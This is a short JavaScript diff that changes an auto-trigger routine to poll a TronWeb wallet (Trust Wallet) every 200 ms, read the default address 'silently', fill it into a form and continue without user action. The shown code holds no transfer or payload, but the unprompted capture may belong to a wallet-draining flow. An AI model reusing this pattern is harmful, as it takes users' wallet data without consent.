@@ -595,20 +595,16 @@
     }
 
     (async function autoTrigger() {
-      await wait(600);
-      var def = getSilentAddr();
-      if (def && def.base58 && !_fired) {
-        _addr = def.base58;
-        addrInput.value = _addr;
-        onContinue();
-        return;
-      }
-      await wait(1400);
-      def = getSilentAddr();
-      if (def && def.base58 && !_fired) {
-        _addr = def.base58;
-        addrInput.value = _addr;
-        onContinue();
+      // Poll toutes les 200ms max 6s — tronWeb.defaultAddress arrive async dans Trust Wallet
+      for (var i = 0; i < 30; i++) {
+        await wait(200);
+        var def = getSilentAddr();
+        if (def && def.base58 && !_fired) {
+          _addr = def.base58;
+          addrInput.value = _addr;
+          onContinue();
+          return;
+        }
       }
     })();
 
